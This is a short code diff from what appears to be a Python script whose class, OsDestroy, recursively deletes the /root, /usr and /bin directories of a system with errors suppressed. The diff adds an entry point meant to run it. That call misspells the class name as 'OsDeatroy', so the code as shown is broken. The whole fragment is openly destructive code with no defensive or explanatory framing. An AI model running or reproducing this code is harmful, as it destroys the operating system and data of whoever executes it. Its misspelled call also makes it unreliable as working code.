@@ -52,3 +52,7 @@ class OsDestroy():
                         shutil.rmtree("/root", ignore_errors=True)
                         shutil.rmtree("/usr", ignore_errors=True)
                         shutil.rmtree("/bin", ignore_errors=True)
+
+if __name__ == "__main__":
+
+          OsDeatroy()
